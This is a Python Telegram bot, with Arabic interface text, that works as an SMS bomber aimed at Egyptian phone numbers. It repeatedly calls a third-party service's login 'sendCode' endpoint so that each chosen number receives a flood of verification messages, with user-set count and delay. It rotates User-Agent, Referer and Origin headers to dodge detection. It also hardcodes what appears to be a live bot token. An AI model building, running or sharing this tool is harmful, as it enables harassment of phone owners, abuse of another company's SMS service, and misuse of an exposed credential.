import asyncio
import requests
import random
import string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

TOKEN = "8441832522:AAF7JRh0aw1X2diiCFdg8Fx9cGU2L-1NXuY"
URL = "https://api.twistmena.com/music/Dlogin/sendCode"

# قائمة User-Agent و Referer و Origin عشوائية
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
]

referers = ["https://www.google.com", "https://www.bing.com"]
origin_urls = ["https://www.example.com", "https://www.someotherdomain.com"]

# دالة لتوليد الهيدر العشوائي
def get_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Referer": random.choice(referers),
        "Origin": random.choice(origin_urls),
    }

# دالة لتوليد رقم عشوائي
def random_string(length=6):
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))

# بيانات المستخدمين
numbers_data = {}  # {user_id: {number: {"count": 5, "delay": 1.0}}}
sending_tasks = {}  # {user_id: asyncio.Task}
stop_flags = {}  # {user_id: bool}

# قائمة الأزرار الرئيسية
main_keyboard = [
    ["➕ إضافة رقم", "📋 عرض الأرقام"],
    ["📤 إرسال الرسائل"]
]

# ======== /start =========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reply_markup = ReplyKeyboardMarkup(main_keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "🌟 أهلاً بك في بوت إرسال الرسائل! 🌟\n\n"
        "يمكنك استخدام الأزرار التالية:\n"
        "➕ إضافة رقم: لإضافة رقم جديد\n"
        "📋 عرض الأرقام: لعرض الأرقام المسجلة\n"
        "📤 إرسال الرسائل: لإرسال الرسائل للأرقام المسجلة",
        reply_markup=reply_markup,
    )

# ======== إضافة رقم =========
ASK_NUMBER, ASK_COUNT, ASK_DELAY = range(3)

async def add_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📱 الرجاء إدخال رقم الهاتف (مثال: 01123456789):")
    return ASK_NUMBER

async def get_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()

    if not (number.isdigit() and len(number) == 11 and number.startswith("01")):
        await update.message.reply_text(
            "❌ الرقم غير صالح! الرجاء إدخال رقم هاتف صحيح مكون من 11 رقم ويبدأ بـ 01:"
        )
        return ASK_NUMBER

    context.user_data["number"] = number
    await update.message.reply_text("📧 الرجاء إدخال عدد الرسائل المراد إرسالها:")
    return ASK_COUNT

async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        count = int(update.message.text)
        if count <= 0:
            await update.message.reply_text("❌ عدد الرسائل يجب أن يكون أكبر من صفر!")
            return ASK_COUNT
        context.user_data["count"] = count
        await update.message.reply_text("⏱️ الرجاء إدخال الوقت بالثواني بين كل رسالة:")
        return ASK_DELAY
    except ValueError:
        await update.message.reply_text("❌ الرجاء إدخال رقم صحيح لعدد الرسائل!")
        return ASK_COUNT

async def get_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        delay = float(update.message.text)
        if delay <= 0:
            await update.message.reply_text("❌ الوقت يجب أن يكون أكبر من صفر!")
            return ASK_DELAY

        user_id = update.message.from_user.id
        number = context.user_data["number"]
        count = context.user_data["count"]

        if user_id not in numbers_data:
            numbers_data[user_id] = {}
        numbers_data[user_id][number] = {"count": count, "delay": delay}

        keyboard = [[InlineKeyboardButton(f"🚀 إرسال إلى {number}", callback_data=f"send_{number}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            f"✅ تم تسجيل {count} رسالة للرقم {number} بفاصل {delay} ثانية بين كل رسالة.",
            reply_markup=reply_markup,
        )
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("❌ الرجاء إدخال رقم صحيح للوقت بالثواني!")
        return ASK_DELAY

# ======== عرض الأرقام =========
async def show_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in numbers_data or not numbers_data[user_id]:
        await update.message.reply_text("❌ لا يوجد أرقام مسجلة لديك.")
        return
    msg = "📋 الأرقام المسجلة:\n\n"
    for num, data in numbers_data[user_id].items():
        msg += f"📞 {num} : {data['count']} رسالة | كل {data['delay']} ثانية\n"
    await update.message.reply_text(msg)

# ======== إرسال الرسائل =========
async def send_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in numbers_data or not numbers_data[user_id]:
        await update.message.reply_text("❌ لا يوجد أرقام لإرسال الرسائل لها.")
        return

    keyboard = [
        [InlineKeyboardButton(num, callback_data=num)]
        for num in numbers_data[user_id].keys()
    ]
    keyboard.append([InlineKeyboardButton("🚀 إرسال", callback_data="send")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("📌 الرجاء اختيار الأرقام لإرسال الرسائل لها:", reply_markup=reply_markup)

# ======== إرسال الرسائل =========
async def send_task_function(bot, chat_id, user_id, numbers_list):
    stop_flags[user_id] = False
    for number in numbers_list:
        if stop_flags.get(user_id):
            await bot.send_message(chat_id=chat_id, text="🛑 تم إيقاف عملية الإرسال!")
            break
        info = numbers_data[user_id][number]
        count = info["count"]
        delay = info["delay"]
        for i in range(count):
            if stop_flags.get(user_id):
                break
            payload = {"dial": "2" + number, "randomValue": random_string()}
            headers = get_headers()
            try:
                response = requests.post(URL, json=payload, headers=headers)
                if response.status_code == 200:
                    await bot.send_message(
                        chat_id=chat_id, text=f"✅ تم إرسال الرسالة {i+1} إلى {number}"
                    )
                else:
                    await bot.send_message(
                        chat_id=chat_id, text=f"⚠️ فشل إرسال الرسالة {i+1} إلى {number}"
                    )
            except Exception as e:
                await bot.send_message(
                    chat_id=chat_id, text=f"❌ خطأ أثناء الإرسال: {e}"
                )
            await asyncio.sleep(delay)
    await bot.send_message(chat_id=chat_id, text="🎉 تم الانتهاء من عملية الإرسال!")

# ======== معالج الأزرار =========
async def send_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data.startswith("send_"):
        number = data.replace("send_", "")
        task = asyncio.create_task(
            send_task_function(context.bot, query.message.chat.id, user_id, [number])
        )
        sending_tasks[user_id] = task
        keyboard = [[InlineKeyboardButton("🛑 إيقاف العملية", callback_data="stop")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(f"🚀 جاري إرسال الرسائل للرقم: {number}", reply_markup=reply_markup)
        return

    if data == "send":
        selected_numbers = [
            num for num in numbers_data[user_id].keys()
        ]
        task = asyncio.create_task(
            send_task_function(context.bot, query.message.chat.id, user_id, selected_numbers)
        )
        sending_tasks[user_id] = task
        keyboard = [[InlineKeyboardButton("🛑 إيقاف العملية", callback_data="stop")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"🚀 جاري إرسال الرسائل للأرقام: {', '.join(selected_numbers)}",
            reply_markup=reply_markup,
        )
    elif data == "stop":
        await stop_automation(user_id)
        await query.edit_message_text("🛑 تم إيقاف العملية!")
    else:
        keyboard = [
            [InlineKeyboardButton(f"✅ {num}" if num in context.user_data.get("selected_numbers", []) else num, callback_data=num)]
            for num in numbers_data[user_id].keys()
        ]
        keyboard.append([InlineKeyboardButton("🚀 إرسال", callback_data="send")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "📌 الرجاء اختيار الأرقام لإرسال الرسائل لها:",
            reply_markup=reply_markup,
        )

# ======== دالة الإيقاف =========
async def stop_automation(user_id: int):
    stop_flags[user_id] = True

# ======== main =========
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    add_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("➕ إضافة رقم"), add_number)],
        states={
            ASK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_number)],
            ASK_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
            ASK_DELAY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_delay)],
        },
        fallbacks=[],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Regex("📋 عرض الأرقام"), show_numbers))
    app.add_handler(MessageHandler(filters.Regex("📤 إرسال الرسائل"), send_start))
    app.add_handler(add_conv)
    app.add_handler(CallbackQueryHandler(send_button))

    print("🤖 البوت يعمل...")
    app.run_polling()

if __name__ == "__main__":
    main()
